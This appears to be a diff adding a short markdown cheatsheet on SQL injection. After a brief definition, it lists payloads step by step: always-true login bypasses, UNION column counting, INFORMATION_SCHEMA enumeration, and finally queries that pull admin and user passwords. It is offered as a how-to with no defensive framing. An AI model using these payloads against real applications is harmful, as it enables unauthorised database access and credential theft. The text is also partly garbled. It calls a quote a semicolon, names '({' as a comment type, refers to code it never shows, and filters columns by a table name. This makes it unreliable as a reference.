@@ -1,0 +1,43 @@
+# SQL INJECTION
+So, what exactly is SQL injection? It is the vulnerability that results when you give an attacker the ability to influence the Structured Query Language (SQL) queries that an application passes to a back-end database. By being able to influence what is passed to the database, the attacker can leverage the syntax and capabilities of SQL itself, as well as the power and flexibility of supporting database functionality and operating system functionality available to the database. SQL injection is not a vulnerability that exclusively affects Web applications; any code that accepts input from an untrusted source and then uses that input to form dynamic SQL statements could be vulnerable (e.g., “fat client” applications in a client/server architecture).
+
+#### Cheatsheet
+
+This SQL code is designed to pull up the records of the specified username from its table of users. However, if the "userName" variable is crafted in a specific way by a malicious user, the SQL statement may do more than the code author intended. For example, setting the "userName" variable as:
+
+    ' OR '1'='1
+
+or using comments to even block the rest of the query (there are three types of SQL comments[13]). All three lines have a space at the end:
+
+    ' OR '1'='1' --
+    ' OR '1'='1' ({
+    ' OR '1'='1' /* 
+    
+#### STEP 1. Search for vulnability
+You can use a semicolon to see if there is a vulnability
+
+    '
+    
+#### STEP 2. Figure out how many columns there are
+You can do this by using this:
+
+    1 order by 1
+    1 order by 2
+    -1 UNION SELECT 1,2,3,4,5,6,7,8,9,-- -
+etc etc
+
+#### STEP 3. Which of the colums allows the query?
+    -1 UNION SELECT 1,2,3,4,5,6,7,8,9,-- -
+    
+#### STEP 4. Tables
+     -1 UNION SELECT 1,group_concat(table_name),3,4,5 from INFORMATION_SCHEMA.tables-- -
+#### STEP 5. Columns
+    -1 UNION SELECT 1,group_concat(column_name),3,4,5 from INFORMATION_SCHEMA.columns--
+    
+#### STEP 6. Columns from table
+    0 UNION SELECT 1,group_concat(column_name),3,4,5 from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = 'gebruikers'
+    0 UNION SELECT 1,group_concat(column_name),3,4,5 from INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME = 'gebruikers'
+    
+#### STEP 7. Use info to get what you want
+    0 UNION SELECT 1,password,3,4,5 from gebruikers
+    0 UNION SELECT 1,group_concat(password),3,4,5 from users WHERE USERNAME = 'admin'
